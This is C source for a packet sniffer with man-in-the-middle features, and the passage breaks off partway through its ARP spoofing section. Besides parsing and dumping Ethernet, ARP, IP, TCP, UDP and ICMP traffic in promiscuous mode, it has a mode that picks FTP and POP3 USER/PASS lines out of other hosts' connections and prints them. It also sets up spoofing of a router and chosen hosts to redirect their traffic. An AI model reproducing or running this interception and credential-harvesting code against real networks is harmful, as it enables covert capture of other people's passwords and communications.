#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

#include <unistd.h>
#include <sys/signal.h>
#include <sys/time.h>

#if defined( _FreeBSD_ ) || defined( _OpenBSD_ ) || defined( _NetBSD_ )
#include <signal.h> /* declaration of sigaction() */
#endif

#include <raw_inet.h>
#include <raw_operations.h>
#include <inet_conv.h>

#include <list.h>

/* this is enough to hold an ethernet packet */
#define	BUFFER_SIZE 2048
/* how many seconds we should wait to send spoofed arp replies */
#define SPOOF_ALARM 15

/**
 * this structure holds the data itself (in 'packet'), pointers to the
 * level 2, 3, and 4 headers (l2_pointer, l3_pointer, and l4_pointer) and
 * the sizes of those areas (header + data of each). it also contains a pointer
 * to access directly to the data layer in TCP, UDP and ICMP (l5_pointer, 
 * l5_size)
 * 'tl' contains the top-level id: for example, if the top-level proto is tcp, 
 * we know that l2_pointer points to an ethernet header, l3_pointer to an
 * ip header and l4_pointer to the tcp header (and l5_pointer will point to 
 * the start of the data, skipping the options in case they're present); 
 * another example: if tl is arp, l2_pointer will be ethernet ant l3_pointer 
 * will point to the arp header. 
 */

struct pkt_pointers_t
{
	struct packet_t
		packet;
	uint8_t *l2_pointer,
		*l3_pointer,
		*l4_pointer,
		*l5_pointer;
	size_t	 l2_size,
		 l3_size,
		 l4_size,
		 l5_size;
	char	tl;	/* top-level id */
};

/* top-level packet identification */
#define __tl_eth   0x01	/* ETH [+unknown] */
#define __tl_arp   0x02	/* ETH + ARP */
#define __tl_ip    0x03 /* ETH + IP [+unknown] */
#define __tl_tcp   0x04 /* ETH + IP + TCP */
#define __tl_udp   0x05	/* ETH + IP + UDP */
#define __tl_icmp  0x06	/* ETH + IP + ICMP */

/* global options */
struct options_t
{
	long	flags,
		max_packets;
} options;

/* behaviour flags (set by command line args), and stored in options.flags */
#define __verbose	  0x0001
#define __full_packets	  0x0002
#define __follow_tcp	  0x0004
#define __follow_new_only 0x0008
#define __spoofing_on	  0x0010
#define __dns_only	  0x0020
#define __user_only	  0x0040
#define __list_desc	  0x0080
#define __long_desc	  0x0100
#define __show_timestamp  0x0200

struct counter_t
{
	unsigned long
		packets,
		forwarded,
		filtered,
		bytes,
		arp,
		ip,
		tcp,
		udp,
		icmp;
} counter;

/* this structure holds all the necessary info to trace a tcp connection
 * and hold the data transmitted in that connection */

struct tcp_connection_t
{
	uint8_t
		client[ IP_ADDR_SIZE ],
		server[ IP_ADDR_SIZE ];
	uint16_t
		client_port,
		server_port;
	_list_t
		packets;
};

/* make access to the connection list nicer */
#define for_each_connection( c, l ) \
	for_each_value( c, l, struct tcp_connection_t* )
#define for_each_packet( p, l ) \
	for_each_value( p, l, struct packet_t* )

struct host_t
{
	char	*name;
	uint8_t	inet_address[ IP_ADDR_SIZE ],
		 hw_address[ MAC_ADDR_SIZE ];
};

/* make access to host lists nicer */
#define for_each_host( h, l ) \
	for_each_value( h, l, struct host_t* )

extern uint8_t
	zeroed_mac[];

/* made global to make use by functions triggered by signals easier */
_list_t tcp_connections = LIST_INITIALIZER,
	spoofed_hosts	= LIST_INITIALIZER;

struct host_t
	*router = NULL;

int	sd;

/* beautify address comparisons */
#define same_ip( ip1, ip2 ) ( !memcmp( ip1, ip2, IP_ADDR_SIZE ) )
#define same_mac( mac1, mac2 ) ( !memcmp( mac1, mac2, MAC_ADDR_SIZE ) )

/* declarations */

void show_eth_header( uint8_t*, int );
void show_arp_packet( uint8_t*, int );
void show_ip_header( uint8_t* );
void show_tcp_packet( struct pkt_pointers_t* );
void show_udp_packet( struct pkt_pointers_t* );
void show_icmp_packet( struct pkt_pointers_t* );
void show_icmp_message( char, char );

int  add_spoofed_host( char* );
int  do_spoof_hosts( int, struct interface_t* );
int  spoof_hosts( struct interface_t* );
void revert_spoofing_state( void );

void sniff_em_all( void );
void show_totals( void );
void at_exit( void );
void set_signal_handlers( void );
void sig_handler( int );
int  show_interface_info();

/* OS dependant */
int  set_promiscuous_mode( int );
void revert_promiscuous( void );
int  set_packet_forwarding( int );
void revert_packet_forwarding();
/**/

/* definitions */

/*********************SHOWING FUNCTIONS********************************/

void show_arp_packet( uint8_t *data, int len )
{
	char	buf_hw_addr[ ADDR_BUFFER_LEN ],
		buf_inet_addr[ ADDR_BUFFER_LEN ];
	struct arp_header
		*header = ( struct arp_header* ) data;

	printf( "  [ ARP header ] \n"
		"    hw_proto: 0x%4.4x - net_proto: 0x%4.4X \n"
		"    hw_len: 0x%2.2x - net_len: 0x%2.2x - op: 0x%4.4x %s \n",
		ntohs( header->hw_proto ), 
		ntohs( header->net_proto ),
		header->hw_len, 
		header->net_len, 
		ntohs( header->operation ),
		( ntohs( header->operation ) == ARP_REQUEST
			? "(request)" 
			: (ntohs( header->operation ) == ARP_REPLY 
			? "(reply)" : "") ));


	printf( "    from: %s\t%s \n",
		inetaddr_to_str( header->orig_net_addr,
				 buf_inet_addr, ADDR_BUFFER_LEN ),
		hwaddr_to_str(   header->orig_hw_addr,
				 buf_hw_addr, ADDR_BUFFER_LEN ) );

	printf( "      to: %s\t%s \n",
		inetaddr_to_str( header->dest_net_addr,
				 buf_inet_addr, ADDR_BUFFER_LEN ),
		hwaddr_to_str(   header->dest_hw_addr,
				 buf_hw_addr, ADDR_BUFFER_LEN ) );

	hexdump( data + sizeof( struct arp_header ),
		  len - sizeof( struct arp_header ) );
}

char* get_icmp_message( char type, char code )
{
	static char	
		*messages[][ 6 ] =
		{
			{ "echo reply", "", "", "", "", "" },
			{ "", "", "", "", "", "" },
			{ "", "", "", "", "", "" },
			{ "net unreachable", "host unreachable", 
			  "protocol unreachable", "port unreachable", 
			  "fragmentation needed and DF set", 
			  "source route failed" },
			{ "source quench", "", "", "", "", "" },
			{ "redirect datagrams for the network",
			  "redirect datagrams for the host",
			  "redirect datagrams for the TOS and network",
			  "redirect datagrams for the TOS and host", "", "" },
			{ "", "", "", "", "", "" },
			{ "", "", "", "", "", "" },
			{ "echo request", "", "", "", "", "" },
			{ "", "", "", "", "", "" },
			{ "", "", "", "", "", "" },
			{ "time to live exceeded in transit",
			  "fragment reassembly time exceeded", 
			  "", "", "", "" },
			{ "parameter problem", "", "", "", "", "" },
			{ "timestamp request", "", "", "", "", "" },
			{ "timestamp reply", "", "", "", "", "" },
			{ "information request", "", "", "", "", "" },
			{ "information reply", "", "", "", "", "" }
		},
		*error = "<wrong code or type>"; 

	if( !(type < 0 || type > 16 || code < 0 || code > 5) )
		return( messages[ (int)type ][ (int)code ] );
	else
		return( error );
}

void show_icmp_packet( struct pkt_pointers_t *pkt_p )
{
	struct icmp_header
		*header = ( struct icmp_header* ) pkt_p->l4_pointer;

	printf( "    [ ICMP header] \n"
		"      type: %i - code: %i - checksum: 0x%4.4x \n"
		"      (%s) \n",
		header->type, 
		header->code, 
		ntohs( header->checksum ),
		get_icmp_message( header->type, header->code ) );

	printf( "    [ ICMP data ] \n" );

	hexdump( pkt_p->l5_pointer, pkt_p->l5_size );
}

void show_udp_packet( struct pkt_pointers_t *pkt_p )
{
	struct udp_header
		*header = ( struct udp_header* ) pkt_p->l4_pointer;

	printf( "    [ UDP header] \n"
		"      %i -> %i - length: %i - checksum: 0x%4.4x \n",
		ntohs( header->orig_port ), 
		ntohs( header->dest_port ), 
		ntohs( header->length ), 
		ntohs( header->checksum ) );
	
	printf( "    [ UDP data ] \n" );

	hexdump( pkt_p->l5_pointer, pkt_p->l5_size );
}

void show_tcp_packet( struct pkt_pointers_t *pkt_p )
{
	struct tcp_header
		*header = ( struct tcp_header* ) pkt_p->l4_pointer;
	
	printf( "    [ TCP header ] \n"
		"      %i -> %i - seq: 0x%8.8x - ack 0x%8.8x \n" 
		"      data_offset: %i - flags: %s%s%s%s%s%s \n"
		"      window: 0x%4.4x - checksum: 0x%4.4x - urg: 0x%4.4x \n",
		ntohs( header->orig_port ), 
		ntohs( header->dest_port ), 
		ntohl( header->seq_num ), 
		ntohl( header->ack_num ), 
		tcp_data_offset( header ), 
		tcp_URG_set( header ) ? "URG " : "",
		tcp_ACK_set( header ) ? "ACK " : "",
		tcp_PSH_set( header ) ? "PSH " : "",
		tcp_RST_set( header ) ? "RST " : "",
		tcp_SYN_set( header ) ? "SYN " : "",
		tcp_FIN_set( header ) ? "FIN " : "",
		ntohs( header->window ), 
		ntohs( header->checksum ), 
		ntohs( header->urg_pointer ) );

	if( pkt_p->l5_pointer ){
		if( pkt_p->l5_pointer > 
			( pkt_p->l4_pointer + sizeof( struct tcp_header ) ))
			goto _options;
		else
			goto _data;
	}else
		if( pkt_p->l4_size > sizeof( struct tcp_header ) )
			goto _options;

_options:
	printf( "    [ TCP options ] \n" );
	hexdump( pkt_p->l4_pointer + sizeof( struct tcp_header ),
		 pkt_p->l4_size    - sizeof( struct tcp_header ) 
		 		   - pkt_p->l5_size );

_data:
	if( !pkt_p->l5_pointer )
		return;
	printf( "    [ TCP data ] \n" );
	hexdump( pkt_p->l5_pointer, pkt_p->l5_size );
}

void show_ip_header( uint8_t *data )
{
	char	buf_orig[ ADDR_BUFFER_LEN ],
		buf_dest[ ADDR_BUFFER_LEN ];
	struct ip_header
		*header = ( struct ip_header* ) data;

	printf( "  [ IP header ] \n"
		"    %s -> %s \n"
		"    ver: %i - ihl: %i - TOS: %i [%c%c%c] - length: %i \n"
		"    id: 0x%4.4x - flags: %s %s - fr.offset: 0x%4.4x \n"
		"    TTL: %i - proto: 0x%2.2x - h_checksum: 0x%4.4x \n",
		inetaddr_to_str( header->orig_addr, 
			buf_orig, ADDR_BUFFER_LEN ),
		inetaddr_to_str( header->dest_addr,
			buf_dest, ADDR_BUFFER_LEN ),
		ip_version( header ), 
		ip_ihl( header ), 
		ip_tos( header ),
		ip_tos_delay( header )       ? 'D':'-',
		ip_tos_throughput( header )  ? 'T':'-',
		ip_tos_reliability( header ) ? 'R':'-',
		ntohs( header->length ), 
		ntohs( header->id ),
		ip_flags( header ) & IP_FLAG_DF ? "DF" : "",
		ip_flags( header ) & IP_FLAG_MF ? "MF" : "", 
		ip_fr_off( header ),
		header->ttl, 
		header->proto, 
		ntohs( header->checksum ) );
}

void show_eth_header( uint8_t *data, int pkt_size )
{
	char	buf_orig[ ADDR_BUFFER_LEN ],
		buf_dest[ ADDR_BUFFER_LEN ];
	struct eth_header
		*header = ( struct eth_header* ) data;

	printf( "%s -> %s | proto: 0x%4.4x (%i bytes) \n",
		hwaddr_to_str( header->orig_addr,
			       buf_orig, ADDR_BUFFER_LEN ),
		hwaddr_to_str( header->dest_addr,
			       buf_dest, ADDR_BUFFER_LEN ),
		ntohs( header->type ), 
		pkt_size );
}

void show_timestamp()
{
	struct tm
		*tm;
	time_t	_time;
	struct timeval
		tv;
	struct timezone
		tz;

	gettimeofday( &tv, &tz );
	_time = tv.tv_sec;
	tm = localtime( &_time );
	
	printf( "%2.2i/%2.2i/%2.2i:%2.2i:%2.2i:%2.2i.%6.6li ",
		tm->tm_year % 100, tm->tm_mon + 1, tm->tm_mday,
		tm->tm_hour, tm->tm_min, tm->tm_sec, tv.tv_usec );
}

#define TIMESTAMP() \
	if( options.flags & __show_timestamp ) \
		show_timestamp()


/************************************************************************/

void show_tcp_data( uint8_t* data, size_t size )
{
	while( size-- ){
		switch( *data ){
			case( '\r' ):
				break;
			case( '\n' ):
				if( size )
					putchar( '\n' );
				break;
			default:
				putchar( *data );
		}
		data++;
	}
}

/*** TCP CONNECTIONS TRACKING **********************************************/
void tcp_data_add( struct pkt_pointers_t *pkt_p,
		   struct tcp_connection_t* conn )
{
	struct packet_t
		*packet;

	if( !pkt_p->l5_pointer )
		return;
	
	packet = (struct packet_t*) 
		allocate( sizeof( struct packet_t ) );
	packet->size = pkt_p->l5_size;
	packet->data = ( uint8_t* ) allocate( packet->size );
	memcpy( packet->data, ( uint8_t* ) 
			pkt_p->l5_pointer, packet->size );

	list_append( packet, &conn->packets );
}

void show_connection_desc( struct tcp_connection_t* conn )
{
	char	buf_client[ ADDR_BUFFER_LEN ],
		buf_server[ ADDR_BUFFER_LEN ];

	printf( "%s:%i <=> %s:%i captured: %4i \n",
		inetaddr_to_str( conn->client, buf_client, ADDR_BUFFER_LEN ),
		ntohs( conn->client_port ),
		inetaddr_to_str( conn->server, buf_server, ADDR_BUFFER_LEN ),
		ntohs( conn->server_port ),
		( int ) list_size( &conn->packets ) );
}

void show_tcp_connections()
{
	struct tcp_connection_t*
		conn;
	struct packet_t*
		data;

	for_each_connection( conn, &tcp_connections ){
		show_connection_desc( conn );
		for_each_packet( data, &conn->packets ){
			show_tcp_data( data->data, data->size );
			putchar( 0x0a );
		}
	}
}

void release_tcp_connections()
{
	struct tcp_connection_t* 
		conn;
	struct packet_t* 
		packet;

	for_each_connection( conn, &tcp_connections ){
		for_each_packet( packet, &conn->packets ){
			release( packet->data );
			release( packet );
		}

		list_clean( &conn->packets );
		release( conn );
	}
	
	list_clean( &tcp_connections );
}

void tcp_conn_new( struct pkt_pointers_t *pkt_p )
{
	struct  ip_header* 
		i_header = ( struct ip_header* )  pkt_p->l3_pointer;
	struct tcp_header* 
		t_header = ( struct tcp_header* ) pkt_p->l4_pointer;
	struct tcp_connection_t
		*conn;
	
	conn = ( struct tcp_connection_t* ) 
		allocate( sizeof( struct tcp_connection_t ) );

	list_init( &conn->packets );

	memcpy( conn->client, i_header->orig_addr, IP_ADDR_SIZE );
	memcpy( conn->server, i_header->dest_addr, IP_ADDR_SIZE );
	
	memcpy( &conn->client_port, &t_header->orig_port, sizeof( uint16_t ) );
	memcpy( &conn->server_port, &t_header->dest_port, sizeof( uint16_t ) );

	/* add the first packet */
	tcp_data_add( pkt_p, conn );
	
	list_append( conn, &tcp_connections );
}

int packet_matches_flow( struct pkt_pointers_t* pkt_p,
			 struct tcp_connection_t* conn )
{
	struct  ip_header* 
		i_header = ( struct ip_header* )  pkt_p->l3_pointer;
	struct tcp_header* 
		t_header = ( struct tcp_header* ) pkt_p->l4_pointer;

	/* compare the ports (least expensive comparison first) */
	if( (t_header->orig_port != conn->client_port &&
	     t_header->orig_port != conn->server_port) ||
	    (t_header->dest_port != conn->client_port &&
	     t_header->dest_port != conn->server_port) )
		return( 0 );

	if( (!same_ip( i_header->orig_addr, conn->client ) &&
	     !same_ip( i_header->orig_addr, conn->server )) ||
	    (!same_ip( i_header->dest_addr, conn->client ) &&
	     !same_ip( i_header->dest_addr, conn->server )) )
		return( 0 );
	     
	return( 1 );
}

int tcp_conn_add( struct pkt_pointers_t *pkt_p )
{
	struct tcp_connection_t
		*conn;

	for_each_connection( conn, &tcp_connections ){
		if( packet_matches_flow( pkt_p, conn ) ){
			tcp_data_add( pkt_p, conn );
			return( 1 );
		}
	}

	return( 0 );
}

void follow_tcp_flow( struct pkt_pointers_t *pkt_p )
{
	struct tcp_header* 
		t_header = ( struct tcp_header* ) pkt_p->l4_pointer;

	/* if the packet doesn't contain a tcp header, discard it */
	if( pkt_p->tl != __tl_tcp )
		return;
	
	/* !tcp_conn_add() means this packet doesn't belong to any of the
	 * connections we're aware of... */
	if( !tcp_conn_add( pkt_p ) ){
		if( (options.flags & __follow_new_only) &&
		     t_header->flags != tcp_SYN )
			return;
		
		tcp_conn_new( pkt_p );
	}
}

/******** OS DEPENDANT ***************************************************/
struct interface_t 
	interface = { DEFAULT_IFACE };

#if defined( _LINUX_ )
int	init_promisc_state = -1,
	init_forwarding_state = -1;

int set_promiscuous_mode( int enable )
{
	struct ifreq
		ifr;
	int 	prev_state;
	
	memset( &ifr, 0x00, sizeof( struct ifreq ) );
	strncpy( ifr.ifr_name, interface.name, sizeof( ifr.ifr_name ) );
	
	if( ioctl( sd, SIOCGIFFLAGS, &ifr ) < 0 ){
		perror( "set_promiscuous_mode(): ioctl( SIOCGIFFLAGS )" );
		return( -1 );
	}

	prev_state = ifr.ifr_flags & IFF_PROMISC;
	
	if( init_promisc_state < 0 )
		init_promisc_state = prev_state;
	
	if( (enable && prev_state) || (!enable && !prev_state) )
		return( 1 );

	if( enable && !prev_state ){
		ifr.ifr_flags |= IFF_PROMISC;
		if( options.flags & __verbose )
			printf( "enabling promiscuous mode for \"%s\" \n", 
				interface.name );
	}
	
	if( !enable && prev_state ){
		ifr.ifr_flags &= ~IFF_PROMISC;
		if( options.flags & __verbose )
			printf( "disabling promiscuous mode for \"%s\" \n", 
				interface.name );
	}

	if( ioctl( sd, SIOCSIFFLAGS, &ifr ) < 0 ){
		perror( "set_promiscuous_mode(): ioctl( SIOCSIFFLAGS )" );
		return( -1 );
	}
	
	return( 1 );
}

void revert_promiscuous( void )
{	
	if( !( init_promisc_state < 0 ) )
		set_promiscuous_mode( init_promisc_state );
}

#if 0
int set_packet_forwarding( int enable )
{
	int	fd,
		prev_state;
	char	prev,
		new;

	if( (fd = open( "/proc/sys/net/ipv4/ip_forward", O_RDWR )) < 0 ){
		perror( "set_packet_forwarding(): open()" );
		return( -1 );
	}

	if( read( fd, &prev, sizeof( char ) ) < 0 ){
		perror( "set_packet_forwarding(): read()" );
		return( -1 );
	}

	prev_state = (prev == '1') ? 1 : 0;

	if( init_forwarding_state < 0 )
		init_forwarding_state = prev_state;

	if( (enable && prev_state) || (!enable && !prev_state) )
		return( 1 );

	if( enable && !prev_state ){
		new = '1';
		if( options.flags & __verbose )
			printf( "enabling packet forwarding \n" );
	}
	
	if( !enable && prev_state ){
		new = '0';
		if( options.flags & __verbose )
			printf( "disabling packet forwarding \n" );
	}
	
	if( write( fd, &new, sizeof( char ) ) < 0 ){
		perror( "set_packet_forwarding(): read()" );
		return( -1 );
	}

	close( fd );
	
	return( 1 );
}
void revert_packet_forwarding()
{
	if( !( init_forwarding_state < 0 ) )
		set_packet_forwarding( init_forwarding_state );
}
#endif
#endif

#if defined( _FreeBSD_ ) || defined( _OpenBSD_ ) || defined( _NetBSD_ )
int set_promiscuous_mode( int enable )
{
	if( enable ){
		if( options.flags & __verbose )
			printf( "setting promiscuous mode for \"%s\" \n",
				interface.name );
		
		if( ioctl( sd, BIOCPROMISC, NULL ) < 0 ){
			perror( "set_promiscuous_mode(): ioctl()" );
			return( -1 );
		}
	}
	
	return( 1 );
}

void revert_promiscuous( void )
{
	 if( options.flags & __verbose )
	 	printf( "bpf closing... "
			"interface automatically restored \n" );
}
#endif

/*************************************************************************/

int show_interface_info()
{
	char	buf_hw[ ADDR_BUFFER_LEN ],
		buf_inet[ ADDR_BUFFER_LEN ],
		buf_mask[ ADDR_BUFFER_LEN ];

	if( get_interface_info( &interface ) < 0 )
		return( -1 );

	if( options.flags & __verbose ){
		printf( "interface: %s [%s] (%s/%s) \n", 
			interface.name,
			hwaddr_to_str(   interface.hw_address,
				buf_hw,   ADDR_BUFFER_LEN ),
			inetaddr_to_str( interface.inet_address,
				buf_inet, ADDR_BUFFER_LEN ),
			inetaddr_to_str( interface.inet_netmask,
				buf_mask, ADDR_BUFFER_LEN ) );
	}

	return( 1 );
}

/********** DESCRIPTIONS ***********************************************/
void show_arp_description( struct pkt_pointers_t *pkt_p )
{
	char	hw_orig[ ADDR_BUFFER_LEN ],
		inet_orig[ ADDR_BUFFER_LEN ],
		inet_dest[ ADDR_BUFFER_LEN ];
	struct arp_header
		*header = ( struct arp_header* ) pkt_p->l3_pointer;

	TIMESTAMP();

	if( ntohs( header->operation ) == ARP_REQUEST )
		printf( "arp: %s (%s): who has %s? \n", 
			inetaddr_to_str( header->orig_net_addr,
					 inet_orig, ADDR_BUFFER_LEN ),
			hwaddr_to_str( header->orig_hw_addr,
					 hw_orig, ADDR_BUFFER_LEN ),
			inetaddr_to_str( header->dest_net_addr,
					 inet_dest, ADDR_BUFFER_LEN ) );
	else
		printf( "arp: %s is at %s -> %s \n",
			inetaddr_to_str( header->orig_net_addr,
					 inet_orig, ADDR_BUFFER_LEN ),
			hwaddr_to_str( header->orig_hw_addr,
					 hw_orig, ADDR_BUFFER_LEN ),
			inetaddr_to_str( header->dest_net_addr,
					 inet_dest, ADDR_BUFFER_LEN ) );
}

/**
 * show_user_info()
 * 	works with pop3 and ftp at the moment
 **/
void show_user_info( struct pkt_pointers_t *pkt_p )
{
	char	inet_orig[ ADDR_BUFFER_LEN ],
		inet_dest[ ADDR_BUFFER_LEN ];
	struct ip_header
		*i_header = ( struct ip_header* ) pkt_p->l3_pointer;
	struct tcp_header
		*t_header = ( struct tcp_header* ) pkt_p->l4_pointer;

	if( pkt_p->tl != __tl_tcp || !pkt_p->l5_pointer )
		return;

	if( ntohs( t_header->dest_port ) != FTP_PORT 
	 && ntohs( t_header->dest_port ) != POP3_PORT )
		return;

	/* l5_pointer is NULL, or points somewhere inside pkt_p->packet->data, 
	 * a buffer bigger than the normal Ethernet MTU, so strstr() will find
	 * a NUL character before reaching the end of that buffer
	 */
	if( strstr( pkt_p->l5_pointer, "USER" )
	 || strstr( pkt_p->l5_pointer, "PASS" ) ){
		TIMESTAMP();
		printf( "%s: %s sending to %s: ",
			(ntohs( t_header->dest_port ) == POP3_PORT)
				? "pop3" : "ftp",
			inetaddr_to_str( i_header->orig_addr, inet_orig, 
				ADDR_BUFFER_LEN ),
			inetaddr_to_str( i_header->dest_addr, inet_dest, 
				ADDR_BUFFER_LEN ) );
		
		show_tcp_data( pkt_p->l5_pointer, pkt_p->l5_size );

		putchar( 0x0a );
	}
}

void show_tcp_description( struct pkt_pointers_t *pkt_p )
{
	char	inet_orig[ ADDR_BUFFER_LEN ],
		inet_dest[ ADDR_BUFFER_LEN ];
	struct ip_header
		*i_header = ( struct ip_header* ) pkt_p->l3_pointer;
	struct tcp_header
		*t_header = ( struct tcp_header* ) pkt_p->l4_pointer;

	switch( ntohs( t_header->dest_port ) ){
		case( FTP_PORT ):
		case( POP3_PORT ):
			show_user_info( pkt_p );
			return;
	}
	
	TIMESTAMP();
	
	printf( "tcp: %s:%i -> %s:%i %s%s%s%s%s%s \n",
		inetaddr_to_str( i_header->orig_addr, inet_orig, 
				ADDR_BUFFER_LEN ),
		ntohs( t_header->orig_port ),
		inetaddr_to_str( i_header->dest_addr, inet_dest, 
				ADDR_BUFFER_LEN ),
		ntohs( t_header->dest_port ),
		tcp_URG_set( t_header ) ? "URG " : "",
		tcp_ACK_set( t_header ) ? "ACK " : "",
		tcp_PSH_set( t_header ) ? "PSH " : "",
		tcp_RST_set( t_header ) ? "RST " : "",
		tcp_SYN_set( t_header ) ? "SYN " : "",
		tcp_FIN_set( t_header ) ? "FIN " : "" );
}

void show_dns_query( uint8_t* data )
{
	char	*name = data + 13;

	while( *name ){
		if( *name < 0x20 )
			putchar( '.' );
		else
			putchar( *name );

		name++;
	}
}

void show_dns_request( struct pkt_pointers_t *pkt_p )
{
	char	inet_orig[ ADDR_BUFFER_LEN ];
	struct ip_header
		*i_header = ( struct ip_header* ) pkt_p->l3_pointer;
	struct udp_header
		*u_header = ( struct udp_header* ) pkt_p->l4_pointer;

	if( pkt_p->tl != __tl_udp 
	  || ntohs( u_header->dest_port ) != DNS_PORT )
		return;
	
	TIMESTAMP();
	
	printf( "dns: %s asking for ", 
		inetaddr_to_str( i_header->orig_addr, inet_orig, 
				 ADDR_BUFFER_LEN ) );

	show_dns_query( pkt_p->l5_pointer );

	putchar( 0x0a );
}

void show_udp_description( struct pkt_pointers_t *pkt_p )
{
	char	inet_orig[ ADDR_BUFFER_LEN ],
		inet_dest[ ADDR_BUFFER_LEN ];
	struct ip_header
		*i_header = ( struct ip_header* ) pkt_p->l3_pointer;
	struct udp_header
		*u_header = ( struct udp_header* ) pkt_p->l4_pointer;

	switch( ntohs( u_header->dest_port ) ){
		case( DNS_PORT ):
			show_dns_request( pkt_p );
			return;
	}

	TIMESTAMP();

	printf( "udp: %s:%i -> %s:%i - %i bytes \n",
		inetaddr_to_str( i_header->orig_addr, inet_orig, 
				ADDR_BUFFER_LEN ),
		ntohs( u_header->orig_port ),
		inetaddr_to_str( i_header->dest_addr, inet_dest, 
				ADDR_BUFFER_LEN ),
		ntohs( u_header->dest_port ),
		pkt_p->l4_size - sizeof( struct udp_header ) );
}

void show_icmp_description( struct pkt_pointers_t *pkt_p )
{
	char	inet_orig[ ADDR_BUFFER_LEN ],
		inet_dest[ ADDR_BUFFER_LEN ];
	struct ip_header
		*i_header = ( struct ip_header* ) pkt_p->l3_pointer;
	struct icmp_header
		*m_header = ( struct icmp_header* ) pkt_p->l4_pointer;

	TIMESTAMP();

	printf( "icmp: %s -> %s ttl:%i %i:%i (%s) \n",
		inetaddr_to_str( i_header->orig_addr,
				 inet_orig, ADDR_BUFFER_LEN ),
		inetaddr_to_str( i_header->dest_addr,
				 inet_dest, ADDR_BUFFER_LEN ),
		i_header->ttl, m_header->type, m_header->code,
		get_icmp_message( m_header->type, m_header->code ) );
}

void show_description( struct pkt_pointers_t *pkt_p )
{
	switch( pkt_p->tl ){
		case( __tl_eth ):
			printf( "eth: unknown type \n" );
			break;
		case( __tl_arp ):
			show_arp_description( pkt_p );
			break;
		case( __tl_ip ):
			printf( "eth + ip: unknown proto \n" );
			break;
		case( __tl_tcp ):
			show_tcp_description( pkt_p );
			break;
		case( __tl_udp ):
			show_udp_description( pkt_p );
			break;
		case( __tl_icmp ):
			show_icmp_description( pkt_p );
			break;
		default:
			printf( "pkt_p->tl: %i not handled \n", pkt_p->tl );
			break;
	}
}

/************************************************************************/

void show_packet( struct pkt_pointers_t *pkt_p )
{
	show_eth_header( pkt_p->l2_pointer, pkt_p->packet.size );

	switch( pkt_p->tl ){
		case( __tl_eth ):
			hexdump( pkt_p->packet.data + pkt_p->l2_size,
				 pkt_p->packet.size - pkt_p->l2_size );
			break;
		case( __tl_arp ):
			show_arp_packet( pkt_p->l3_pointer, 
					 pkt_p->l3_size );
			break;
		case( __tl_ip ):
			show_ip_header( pkt_p->l3_pointer );
			hexdump( pkt_p->packet.data + pkt_p->l2_size
						    + pkt_p->l3_size,
				 pkt_p->packet.size - pkt_p->l2_size
				 		    - pkt_p->l3_size );
			break;
		case( __tl_tcp ):
			show_ip_header( pkt_p->l3_pointer );
			show_tcp_packet( pkt_p );
			break;
		case( __tl_udp ):
			show_ip_header( pkt_p->l3_pointer );
			show_udp_packet( pkt_p );
			break;
		case( __tl_icmp ):
			show_ip_header( pkt_p->l3_pointer );
			show_icmp_packet( pkt_p );
			break;
	}

	putchar( 0x0a );
}

void reset_pkt_pointers( struct pkt_pointers_t* pkt_p )
{
	pkt_p->packet.size = 0;
	pkt_p->tl = 0;
	pkt_p->l2_pointer = 
	pkt_p->l3_pointer = 
	pkt_p->l4_pointer = 
	pkt_p->l5_pointer = NULL;
	pkt_p->l2_size = 
	pkt_p->l3_size = 
	pkt_p->l4_size = 
	pkt_p->l5_size = 0;
}

size_t tcp_data_start( struct tcp_header *t_header, int len )
{
	size_t	opt_size,
		start = sizeof( struct tcp_header );

	if( (opt_size = tcp_data_offset( t_header ) * 4
				- sizeof( struct tcp_header )) > 0 )
		start += opt_size;

	if( !(start < len) )
		return( -1 );

	return( start );
}

void parse_packet( struct pkt_pointers_t *pkt_p )
{
	struct eth_header *e_header;
	struct ip_header  *i_header;

	pkt_p->l2_pointer = pkt_p->packet.data;
	pkt_p->l2_size = sizeof( struct eth_header );
	e_header = (struct eth_header* ) pkt_p->l2_pointer;

	pkt_p->l3_pointer = pkt_p->l2_pointer + sizeof( struct eth_header );

	switch( htons( e_header->type ) ){
		case( ARP_TYPE ):
			counter.arp++;
			pkt_p->l3_size = pkt_p->packet.size - pkt_p->l2_size;
			pkt_p->tl = __tl_arp;
			return;
		case( IP_TYPE ):
			counter.ip++;
			pkt_p->l3_size = sizeof( struct ip_header );
			pkt_p->tl = __tl_ip;
			break;
		default:
			pkt_p->tl = __tl_eth;
	}

	i_header = ( struct ip_header* ) pkt_p->l3_pointer;
	pkt_p->l4_pointer = pkt_p->l3_pointer + pkt_p->l3_size;
	pkt_p->l4_size = pkt_p->packet.size - pkt_p->l2_size - pkt_p->l3_size;

	switch( i_header->proto ){
		case( TCP_PROTO ):
			counter.tcp++;
	
			pkt_p->l5_pointer = pkt_p->l4_pointer 
				+ tcp_data_start( ( struct tcp_header* ) 
						  pkt_p->l4_pointer, 
						  pkt_p->l4_size );
			pkt_p->l5_size = pkt_p->l4_size
				- ( pkt_p->l5_pointer - pkt_p->l4_pointer );

			if( pkt_p->l5_pointer < pkt_p->l4_pointer ){
				pkt_p->l5_pointer = 0x00;
				pkt_p->l5_size    = 0x00;
			}

			pkt_p->tl = __tl_tcp;
			break;
		case( UDP_PROTO ):
			counter.udp++;

			pkt_p->l5_pointer = pkt_p->l4_pointer 
				+ sizeof( struct udp_header );
			pkt_p->l5_size = pkt_p->l4_size
				- sizeof( struct udp_header );

			pkt_p->tl = __tl_udp;
			break;
		case( ICMP_PROTO ):
			counter.icmp++;

			pkt_p->l5_pointer = pkt_p->l4_pointer 
				+ sizeof( struct icmp_header );
			pkt_p->l5_size = pkt_p->l4_size
				- sizeof( struct icmp_header );

			pkt_p->tl = __tl_icmp;
			break;
		case( IGMP_PROTO ):
			break;
		default:
			/* ip's contents are unknown... */
			break;
	}
}

/************************* SPOOFING *****************************/

int set_router( char *host )
{
	if( router )
		return( 0 );

	router = ( struct host_t* ) allocate( sizeof( struct host_t ) );

	router->name = ( char* ) allocate( strlen( host ) + 1 );
	memcpy( router->name, host, strlen( host ) );

	list_append( router, &spoofed_hosts );

	return( 1 );
}

int add_spoofed_host( char *host )
{
	struct host_t
		*s_host = ( struct host_t* ) 
			allocate( sizeof( struct host_t ) );

	s_host->name = ( char* ) allocate( strlen( host ) + 1 );
	memcpy( s_host->name, host, strlen( host ) );
	
	list_append( s_host, &spoofed_hosts );
	
	return( 1 );
}

void show_spoofed_arp( struct arp_params* params, int spoof )
{
	char	arp_hw_orig[ ADDR_BUFFER_LEN ],
		arp_hw_dest[ ADDR_BUFFER_LEN ],
